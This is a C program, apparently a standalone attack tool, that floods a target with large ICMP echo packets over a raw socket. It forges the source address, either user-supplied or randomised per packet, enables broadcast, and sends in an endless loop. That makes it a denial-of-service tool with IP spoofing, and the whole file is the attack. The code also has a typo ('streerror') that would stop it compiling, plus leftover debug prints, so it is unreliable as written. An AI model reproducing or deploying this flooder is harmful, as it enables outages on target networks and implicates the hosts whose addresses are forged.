#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

#define TRUE 1
#define FALSE 0

unsigned short in_cksum(unsigned short *addr, int len);
void help(char **arg);
void parse_argv(int argnum, char **arg);

int RAND = FALSE;
char *help_msg = "--help: display this message\n-r: use a randomly generated ip address as source address (omit the source address argument)\n";

int main(int argc, char **argv){

	struct sockaddr_in target;
	int sock_fd, on = 1;
	struct hostent *dest, *src;
	char sendbuf[sizeof(struct ip) + sizeof(struct icmp) + 1400];
	struct ip *ip;
	struct icmp *icmp;

	if(argc < 2){
		help(argv);
		exit(1);
	}
	else
		parse_argv(argc, argv);

	printf("Here\n");

	if((sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(2);
	}
	setuid(getuid());

	if(setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(3);
	}

	if(setsockopt(sock_fd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) == -1){
		fprintf(stderr, "%s\n", streerror(errno));
		exit(4);
	}

	ip = (struct ip *)sendbuf;
	icmp = (struct icmp *)(sendbuf + sizeof(struct ip));

	ip->ip_hl = 5;
	ip->ip_v = 4;
	ip->ip_tos = 0; 
	ip->ip_len = htons(sizeof(struct ip) + sizeof(struct icmp) + 1400);
	ip->ip_id = getuid();
	ip->ip_off = 0;
	ip->ip_ttl = 255;
	ip->ip_p = IPPROTO_ICMP;
	ip->ip_sum = 0;
	ip->ip_sum = in_cksum((unsigned short *)ip, sizeof(struct ip));

	printf("Here\n");

	if(RAND){
		
		ip->ip_src.s_addr = random();

		if((dest = gethostbyname(argv[1])) == NULL){
			fprintf(stderr, "%s\n", strerror(errno));
			exit(5);
		}

		ip->ip_dst = *(struct in_addr *)dest->h_addr;
	}
	else{
		if((src = gethostbyname(argv[1])) == NULL){
			fprintf(stderr, "%s\n", strerror(errno));
			exit(6);
		}

		ip->ip_src = *(struct in_addr *)src->h_addr;

		if((dest = gethostbyname(argv[2])) == NULL){
			fprintf(stderr, "%s\n", strerror(errno));
			exit(7);
		}

		ip->ip_dst = *(struct in_addr *)dest->h_addr;

	}

	memset(&target, 0, sizeof(target));
	target.sin_family = AF_INET;
	target.sin_addr = *(struct in_addr *)dest->h_addr;

	printf("%s\n", inet_ntoa(target.sin_addr));

	icmp->icmp_type = ICMP_ECHO;
	icmp->icmp_code = 0;
	icmp->icmp_id = getuid();
	icmp->icmp_seq = 1;
	icmp->icmp_cksum = 0;
	icmp->icmp_cksum = in_cksum((unsigned short *)icmp, sizeof(struct icmp) + 1400);
	
	while(TRUE){
		if(sendto(sock_fd, sendbuf, sizeof(struct ip) + sizeof(struct icmp) + 1400, 0, (struct sockaddr *)&target, sizeof(target)) == -1){
			fprintf(stderr, "%s\n", strerror(errno));
			exit(8);
		}
		if(RAND)
			ip->ip_src.s_addr = random();
	}

	return 0;
}

unsigned short in_cksum(unsigned short *addr, int len){

	unsigned short result;
	unsigned int sum = 0;

	while(len> 1){
		sum += *addr++;
		len -= 2 ;
	}

	if (len == 1)
		sum += *(unsigned char*)addr;
		
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	result = ~sum;
	return result;
}

void help(char **arg){

	fprintf(stderr, "Usage: ./%s [source ip] [target ip] { Options }\n\n%s", arg[0], help_msg);
	exit(0);
}

void parse_argv(int argnum, char **arg){

	int i;
	for (i = 0; i < argnum; i++){
		if(!strcmp(arg[i], "-r")){
			RAND = TRUE;
		}
		if(!strcmp(arg[i], "--help")){
			help(arg);
			exit(0);
		}
	}
}